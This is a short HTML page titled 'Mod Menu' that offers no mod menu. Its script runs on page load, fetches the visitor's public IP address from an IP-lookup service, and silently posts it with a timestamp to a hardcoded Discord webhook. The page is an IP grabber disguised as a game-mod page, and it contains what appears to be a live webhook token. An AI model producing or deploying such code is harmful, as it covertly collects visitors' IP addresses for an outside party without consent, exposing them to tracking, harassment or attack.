<!DOCTYPE html>
<html>
<head>
  <title>Mod Menu</title>
</head>
<body>
  <h1>Mod Menu</h1>
  <script>
    function sendIP(ip, timestamp) {
      var webhookURL = 'https://discord.com/api/webhooks/1155301904771973282/4CL70Krtsq1VSUM8nCYTXyTaRWYknNQlVn1zROZ21tOcvwdAL9cZ-IzlVRRl6Rx_7UKx';

      var payload = JSON.stringify({
        content: 'IP: ' + ip + ', Timestamp: ' + timestamp
      });

      // Send a POST request to the webhook URL
      var xhr = new XMLHttpRequest();
      xhr.open('POST', webhookURL, true);
      xhr.setRequestHeader('Content-type', 'application/json');
      xhr.send(payload);
    }

    // Fetch the IP using a third-party service and get the current timestamp
    fetch('https://api.ipify.org?format=json')
      .then(response => response.json())
      .then(data => {
        var ip = data.ip;
        var timestamp = new Date().toLocaleString();
        sendIP(ip, timestamp);
      })
      .catch(error => console.error(error));
  </script>
</body>
</html>
